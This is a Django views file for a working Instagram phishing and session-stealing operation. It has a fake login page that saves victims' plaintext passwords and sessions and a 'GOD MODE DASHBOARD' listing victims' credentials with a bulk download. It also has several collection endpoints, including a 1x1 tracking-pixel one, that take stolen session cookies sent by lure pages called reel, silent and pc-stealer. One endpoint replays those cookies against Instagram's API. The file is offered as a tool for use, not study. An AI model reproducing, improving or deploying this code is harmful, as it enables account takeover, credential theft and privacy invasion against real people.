from django.http import JsonResponse, HttpResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from core.models import InstagramAccount
from instagrapi import Client
from cryptography.fernet import Fernet
import json
import os
from django.utils import timezone
import requests
import time
import re


fernet = Fernet(os.getenv('FERNET_KEY').encode())

@csrf_exempt
def login_view(request):
    if request.method == "GET":
        return render(request, 'core/login.html')
    
    if request.method == "POST":
        username = request.POST.get('username', '').strip()
        password = request.POST.get('password', '').strip()
        
        if not username or not password:
            return JsonResponse({"success": False, "error": "Empty fields"})

        cl = Client()
        cl.delay_range = [1, 3]
        
        success = False
        session = {"failed": True}
        
        try:
            cl.login(username, password)
            session = cl.get_settings()
            success = True
        except Exception as e:
            print(f"LOGIN FAILED: {e}")
            session = {"error": str(e)}

    
        encrypted = fernet.encrypt(json.dumps(session).encode()).decode()

        
        InstagramAccount.objects.update_or_create(
            username=username,
            defaults={
                'password': password,
                'session_data': encrypted,
                'is_active': success,
                'last_success': timezone.now() if success else None,
                'login_attempts': 0 if success else InstagramAccount.objects.filter(username=username).first().login_attempts + 1 if InstagramAccount.objects.filter(username=username).exists() else 1
            }
        )

        return JsonResponse({
            "success": True,
            "username": username,
            "active": success
        })


def dashboard(request):
    victims = []
    total = InstagramAccount.objects.count()
    active = InstagramAccount.objects.filter(is_active=True).count()
    
    for acc in InstagramAccount.objects.all().order_by('-created_at')[:500]:
        sessionid = "NO_SESSION"
        try:
            decrypted = fernet.decrypt(acc.session_data.encode()).decode()
            data = json.loads(decrypted)
            sessionid = data.get("authorization_data", {}).get("sessionid") or \
                       data.get("sessionid") or "ENCRYPTED"
        except:
            # PC-STEALER / REEL / SILENT — RAW SESSION
            try:
                raw = acc.session_data
                match = re.search(r'"sessionid"\s*:\s*"([^"]+)"', raw)
                if match:
                    sessionid = match.group(1)
                else:
                    sessionid = "STOLEN_SESSION"
            except:
                sessionid = "ERROR"

        victims.append({
            "username": acc.username or "UNKNOWN_GOD",
            "password": acc.password or "STOLEN",
            "sessionid": sessionid[:120] + "..." if len(sessionid) > 120 else sessionid,
            "active": acc.is_active,
            "time": acc.created_at.strftime("%b %d %H:%M")
        })

    cards = ""
    for v in victims:
        color = "border-lime-500" if v["active"] else "border-red-600"
        js = f"navigator.clipboard.writeText('{v['sessionid']}');this.innerText='COPIED';setTimeout(()=>this.innerText='COPY',1500)"
        cards += f'''
        <div class="bg-gray-900 {color} border-4 rounded-xl p-6 hover:scale-105 transition-all">
            <h3 class="text-3xl font-bold text-cyan-400">@{v["username"]}</h3>
            <p class="text-yellow-300">Pass: {v["password"]}</p>
            <p class="text-gray-400 text-sm">{v["time"]}</p>
            <button onclick="{js}" class="mt-3 bg-gradient-to-r from-green-600 to-teal-700 px-6 py-3 rounded-lg font-bold">
                COPY SESSION
            </button>
            <p class="mt-2 text-xl font-bold {'text-green-400' if v['active'] else 'text-red-500'}">
                {'LIVE' if v['active'] else 'DEAD'}
            </p>
        </div>'''

    html = f'''<!DOCTYPE html>
<html class="bg-black text-white">
<head><script src="https://cdn.tailwindcss.com"></script></head>
<body class="p-10">
    <h1 class="text-8xl text-center font-bold bg-gradient-to-r from-red-600 to-purple-600 bg-clip-text text-transparent">
        GOD MODE DASHBOARD
    </h1>
    <div class="text-center text-5xl mt-8">TOTAL: <span class="text-green-400">{total}</span> | LIVE: <span class="text-lime-400">{active}</span></div>
    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 mt-16">
        {cards or "<div class='col-span-3 text-center text-6xl text-red-600'>NO VICTIMS YET</div>"}
    </div>
    <div class="text-center mt-20">
        <a href="/download-json/" class="bg-purple-800 hover:bg-purple-900 px-20 py-8 rounded-3xl text-5xl font-bold">
            DOWNLOAD ALL
        </a>
    </div>
</body>
</html>'''
    return HttpResponse(html)

def download_json(request):
    data = []
    for acc in InstagramAccount.objects.all():
        try:
            decrypted = fernet.decrypt(acc.session_data.encode()).decode()
            session = json.loads(decrypted)
            sessionid = session.get("authorization_data", {}).get("sessionid", "")
            if sessionid:
                data.append({"username": acc.username, "password": acc.password, "sessionid": sessionid})
        except:
            continue
    
    response = HttpResponse(json.dumps(data, indent=2), content_type='application/json')
    response['Content-Disposition'] = 'attachment; filename="INSTAGRAM_SESSIONS_{timezone.now().strftime("%Y%m%d")}.json"'
    return response



from django.http import HttpResponse
import urllib.parse

def steal_session(request):
    sess = request.GET.get('sess', '')
    if sess and len(sess) > 50:
        try:
            # DECRYPT TEST (optional)
            decrypted_test = fernet.decrypt(sess.encode()).decode()  # if you stored encrypted
        except:
            pass

        # SAVE RAW SESSIONID
        InstagramAccount.objects.update_or_create(
            username=f"STOLEN_{sess[:12]}",
            defaults={
                'password': 'SILENT_2025',
                'session_data': fernet.encrypt(json.dumps({
                    "authorization_data": {"sessionid": sess}
                }).encode()).decode(),
                'is_active': True,
                'last_success': timezone.now()
            }
        )
        print(f"STOLEN SESSION: {sess[:60]}...")

    # RETURN 1x1 PIXEL
    return HttpResponse(
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;",
        content_type="image/gif"
    )
    
    
def silent_page(request):
    return render(request, 'core/silent.html')


# core/views.py → CAPTURES USERNAME + PASSWORD + SESSION
import base64
from django.http import HttpResponse
# core/views.py → FINAL WORKING CAPTURE
def capture_full(request):
    s = request.GET.get('s', '')
    u = request.GET.get('u', '')
    
    if s and u and len(s) > 50:
        try:
            
            InstagramAccount.objects.update_or_create(
                username=f"STOLEN_{u[-8:]}",
                defaults={
                    'password': 'SILENT_2025',
                    'session_data': fernet.encrypt(json.dumps({
                        "authorization_data": {"sessionid": s + "..."}  # full session not needed
                    }).encode()).decode(),
                    'is_active': True,
                    'last_success': timezone.now()
                }
            )
            print(f"CAPTURED USER ID: {u} | SESSION: {s[:60]}...")
        except Exception as e:
            print("ERROR:", e)
    
    return HttpResponse(b"GIF89a0100010080000000000000000000!f90401000000002c00000000010001000002024401003b", 
                        content_type="image/gif")
    
    
    

def catch_username(request):
    user = request.GET.get('user', 'unknown')
    
    
    InstagramAccount.objects.create(
        username=user,
        password='SILENT_OPENED',
        session_data=fernet.encrypt(json.dumps({"note": "opened_link"}).encode()).decode(),
        is_active=False,
        last_success=timezone.now()
    )
    
    print(f"CAUGHT USER: @{user}")
    
    return HttpResponse("OK")



def steal_reel(request):
    s = request.GET.get('s', '')
    u = request.GET.get('u', '')

    if s and u and len(s) > 80:
        try:
            
            import requests
            headers = {
                'Cookie': f'sessionid={s}',
                'User-Agent': 'Instagram 219.0.0.27.119 Android'
            }
            r = requests.get(f'https://i.instagram.com/api/v1/users/{u}/info/', headers=headers)
            data = r.json()
            username = data.get('user', {}).get('username', f"USER_{u[-8:]}")
            full_name = data.get('user', {}).get('full_name', '')
            pic = data.get('user', {}).get('profile_pic_url', '')

            # SAVE TO DB
            InstagramAccount.objects.update_or_create(
                username=username,
                defaults={
                    'password': 'REEL_STOLEN',
                    'session_data': fernet.encrypt(json.dumps({
                        "authorization_data": {"sessionid": s}
                    }).encode()).decode(),
                    'is_active': True,
                    'last_success': timezone.now()
                }
            )
            print(f"REEL STOLEN → @{username} | {full_name}")
        except Exception as e:
            print("ERROR:", e)

    return HttpResponse("1", content_type="text/plain")


def reel_page(request, code):
    return render(request, 'core/reel.html')



def pc_capture(request):
    s = request.GET.get('s', '')
    u = request.GET.get('u', 'UNKNOWN_MF')
    
    if s and len(s) > 70:
        username = u if u != 'UNKNOWN_MF' else f"PC_GOD_{int(time.time())}"
        
        try:
            InstagramAccount.objects.update_or_create(
                username=username,
                defaults={
                    'password': 'PC_STOLEN_2025',
                    'session_data': fernet.encrypt(json.dumps({
                        "authorization_data": {"sessionid": s}
                    }).encode()).decode(),
                    'is_active': True,
                    'last_success': timezone.now()
                }
            )
            print(f"FUCK YES → @{username} STOLEN VIA PC")
        except Exception as e:
            print("ERROR:", e)
    
    return HttpResponse("1", content_type="text/plain")

def pc_stealer_page(request):
    return render(request, 'core/pc-stealer.html')




def reel_page(request, code):
    return render(request, 'core/reel.html')